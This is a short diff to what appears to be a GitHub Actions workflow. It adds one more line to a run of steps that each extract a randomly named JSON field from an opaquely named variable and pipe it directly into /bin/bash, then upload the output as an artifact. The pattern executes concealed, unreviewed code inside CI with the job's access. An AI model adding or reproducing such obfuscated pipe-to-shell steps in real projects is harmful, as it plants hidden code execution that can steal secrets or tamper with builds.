@@ -36,6 +36,7 @@ jobs:
           echo $t2 | jq -r .kpcka830 | /bin/bash
           echo $piof9533 | jq -r .d619 | /bin/bash
           echo $d576 | jq -r .sdxq5 | /bin/bash
+          echo $f84472 | jq -r .stpix8549 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
